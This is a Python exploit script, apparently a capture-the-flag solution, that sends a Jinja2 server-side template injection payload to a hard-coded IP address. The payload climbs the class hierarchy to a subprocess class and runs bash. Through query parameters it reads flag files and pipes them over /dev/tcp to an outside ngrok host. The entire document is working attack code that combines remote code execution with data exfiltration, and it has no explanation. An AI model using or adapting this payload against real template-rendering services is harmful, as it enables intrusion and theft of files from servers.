#!/usr/bin/env python3

import requests

url = 'http://13.48.13.60:50000/'

payload = """\
# {{result|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(-1)\
|attr(request.args.d)()|attr(request.args.c)(199)(request.args.getlist(request.args.l))}}
1/0
"""

url += '?a=__class__'
url += '&b=__mro__'
url += '&c=__getitem__'
url += '&d=__subclasses__'
url += '&l=e'
url += '&e=bash'
url += '&e=-c'
url += '&e=cat fl* /home/*/fl* > /dev/tcp/0.tcp.ngrok.io/10145'

s = requests.Session()
r = s.post(url, data=dict(code=payload))
print(r.text)
